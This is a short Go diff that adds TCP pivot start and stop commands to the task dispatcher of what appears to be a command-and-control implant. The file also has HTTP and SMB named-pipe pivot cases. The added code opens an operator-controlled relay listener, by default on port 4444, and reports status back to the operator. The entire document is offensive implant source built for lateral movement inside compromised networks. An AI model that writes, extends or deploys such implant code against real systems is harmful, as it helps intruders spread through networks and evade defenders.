@@ -880,6 +880,28 @@ func dispatchTask(t transport, task taskWire) {
 	case "HTTP_PIVOT_STOP":
 		t.sendResult(task.ID, stopHTTPPivot(), "")
 
+	case "TCP_PIVOT_START":
+		port := 4444
+		if task.Args != "" {
+			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
+				port = p
+			}
+		}
+		if err := startTCPPivot(port); err != nil {
+			t.sendResult(task.ID, "", "tcp pivot start failed: "+err.Error())
+			return
+		}
+		t.sendResult(task.ID, fmt.Sprintf("[+] TCP pivot listening on :%d", port), "")
+
+	case "TCP_PIVOT_STOP":
+		port := 0
+		if task.Args != "" {
+			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
+				port = p
+			}
+		}
+		t.sendResult(task.ID, stopTCPPivot(port), "")
+
 	// ── SMB named pipe pivot server ───────────────────────────────────────────
 
 	case "PIPE_START":
